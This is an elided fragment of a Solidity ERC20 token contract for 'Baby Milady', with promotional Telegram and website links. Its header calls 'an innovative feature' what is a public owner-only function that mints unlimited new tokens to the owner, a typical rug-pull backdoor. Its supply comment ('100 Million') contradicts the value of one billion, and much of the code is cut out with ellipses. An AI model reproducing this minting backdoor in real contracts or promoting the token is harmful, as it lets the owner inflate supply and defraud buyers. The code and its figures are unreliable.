...
//
// $BabyMilady proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BabyMiladybsc
//  📱 Website::https://babymilady.net
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BabyMilady(uint256 amount) public onlyOwner {
 _BabyMilady(msg.sender, amount);
    }
    ...
    function _BabyMilady(address account, uint256 amount) internal virtual {
...
contract $BabyMilady is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Baby Milady", "BABYMILADY") {
    _BabyMilady(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}